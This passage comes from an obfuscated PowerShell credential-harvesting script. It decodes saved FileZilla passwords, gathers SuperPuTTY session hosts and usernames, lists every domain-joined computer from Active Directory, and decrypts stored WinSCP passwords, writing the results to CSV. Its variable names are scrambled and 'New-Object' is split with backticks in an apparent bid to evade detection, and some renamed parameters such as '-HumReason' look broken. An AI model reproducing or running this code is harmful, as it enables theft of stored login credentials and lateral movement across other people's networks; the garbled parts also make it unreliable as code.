                  $FileZillaSessionHash["Password"] = $_.InnerText
              } else {
                  # Populate session data based on the node name
                  $FileZillaSessionHash[$_.Name] = $_.InnerText
              }
              
          }

      }

    # Create object from collected data, excluding some trivial information
    [void]$InjureCut.Add((ne`w`-`ob`ject PSObject -Property $FileZillaSessionHash | Select-Object -Property * -ExcludeProperty "#text",LogonType,Type,BypassProxy,SyncBrowsing,PasvMode,DirectoryComparison,MaximumMultipleConnections,EncodingType,TimezoneOffset,Colour))
     
  } # ForEach FileZillaSession in FileZillaXML.SelectNodes()
  
  # base64_decode the stored encoded session passwords, and decode protocol
  foreach ($NarrowCamp in $InjureCut) {
      $NarrowCamp.Password = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($NarrowCamp.Password))
      if ($NarrowCamp.Protocol -eq "0") {
        $NarrowCamp.Protocol = "Use FTP over TLS if available"
      } elseif ($NarrowCamp.Protocol -eq 1) {
        $NarrowCamp.Protocol = "Use SFTP"
      } elseif ($NarrowCamp.Protocol -eq 3) {
        $NarrowCamp.Protocol = "Require implicit FTP over TLS"
      } elseif ($NarrowCamp.Protocol -eq 4) {
        $NarrowCamp.Protocol = "Require explicit FTP over TLS"
      } elseif ($NarrowCamp.Protocol -eq 6) {
        $NarrowCamp.Protocol = "Only use plain FTP (insecure)"
      } 
  }

  if ($HeadyDucks) {
    $InjureCut | Export-CSV -Append -Path ($JogMeasly + "\FileZilla.csv") -NoTypeInformation
  } else {
    Write-Output "FileZilla Sessions"
    $InjureCut | Format-List | Out-String
  }

  # Add the array of FileZilla session objects to the target user object
  $WayBuzz | Add-Member -MemberType NoteProperty -Name "FileZilla Sessions" -HumReason $InjureCut

} # ProcessFileZillaFile

function ProcessSuperPuTTYFile($MarchSlope) {

  foreach($SneakyFlag in $MarchSlope.ArrayOfSessionData.SessionData) {

    foreach ($SquareThing in $SneakyFlag) { 
      if ($SquareThing -ne $null) {

        $BlindWar = "" | Select-Object -Property "Source","SessionId","SessionName","Host","Username","ExtraArgs","Port","Putty Session"

        $BlindWar."Source" = $DoubtQuilt
        $BlindWar."SessionId" = $SquareThing.SessionId
        $BlindWar."SessionName" = $SquareThing.SessionName
        $BlindWar."Host" = $SquareThing.Host
        $BlindWar."Username" = $SquareThing.Username
        $BlindWar."ExtraArgs" = $SquareThing.ExtraArgs
        $BlindWar."Port" = $SquareThing.Port
        $BlindWar."PuTTY Session" = $SquareThing.PuttySession

        [void]$ReplySponge.Add($BlindWar)
      } 
    }

  } # ForEach SuperPuTTYSessions

  if ($HeadyDucks) {
    $ReplySponge | Export-CSV -Append -Path ($JogMeasly + "\SuperPuTTY.csv") -NoTypeInformation
  } else {
    Write-Output "SuperPuTTY Sessions"
    $ReplySponge | Out-String
  }

  # Add the array of SuperPuTTY session objects to the target user object
  $WayBuzz | Add-Member -MemberType NoteProperty -Name "SuperPuTTY Sessions" -HumReason $ReplySponge

} # ProcessSuperPuTTYFile

####################################################################################
####################################################################################
## WinSCP Deobfuscation Helper Functions
####################################################################################
####################################################################################

# Gets all domain-joined computer names and properties in one object
function GetComputersFromActiveDirectory {

  $SchoolYawn = "computer"
  $WaxGather = ne`w`-`ob`ject System.DirectoryServices.DirectoryEntry
  $WoodSlim = ne`w`-`ob`ject System.DirectoryServices.DirectorySearcher
  $WoodSlim.SearchRoot = $WaxGather
  $WoodSlim.Filter = ("(objectCategory=$SchoolYawn)")

  $TreeUpset = "name"

  foreach ($TeaseWooden in $TreeUpset){$WoodSlim.PropertiesToLoad.Add($TeaseWooden)}

  return $WoodSlim.FindAll()

}

function DecryptNextCharacterWinSCP($SpicyPoised) {

  # Creates an object with flag and remainingPass properties
  $DailyIron = "" | Select-Object -Property flag,remainingPass

  # Shift left 4 bits equivalent for backwards compatibility with older PowerShell versions
  $AcceptAunt = ("0123456789ABCDEF".indexOf($SpicyPoised[0]) * 16)
  $AvoidMiss = "0123456789ABCDEF".indexOf($SpicyPoised[1])

  $BaitPunish = $AcceptAunt + $AvoidMiss

  $ScrubBolt = (((-bnot ($BaitPunish -bxor $EvenBury)) % 256) + 256) % 256

  $DailyIron.flag = $ScrubBolt
  $DailyIron.remainingPass = $SpicyPoised.Substring(2)

  return $DailyIron

}

function DecryptWinSCPPassword($HoleFirst, $TrickQuilt, $MassAdd) {

  $ThreadFix = 255
  $EvenBury = 163

  $TickPricey = 0
  $UsedSkate =  $HoleFirst + $TrickQuilt
  $UnitReward = DecryptNextCharacterWinSCP($MassAdd)

  $TwistBore = $UnitReward.flag 

  if ($UnitReward.flag -eq $ThreadFix) {
    $UnitReward.remainingPass = $UnitReward.remainingPass.Substring(2)
    $UnitReward = DecryptNextCharacterWinSCP($UnitReward.remainingPass)
  }

  $TickPricey = $UnitReward.flag

  $UnitReward = DecryptNextCharacterWinSCP($UnitReward.remainingPass)
  $UnitReward.remainingPass = $UnitReward.remainingPass.Substring(($UnitReward.flag * 2))

  $DogsPizzas = ""
  for ($TeaseWooden=0; $TeaseWooden -lt $TickPricey; $TeaseWooden++) {
    $UnitReward = (DecryptNextCharacterWinSCP($UnitReward.remainingPass))
    $DogsPizzas += [char]$UnitReward.flag
  }

  if ($TwistBore -eq $ThreadFix) {
    return $DogsPizzas.Substring($UsedSkate.length)
  }

  return $DogsPizzas

}
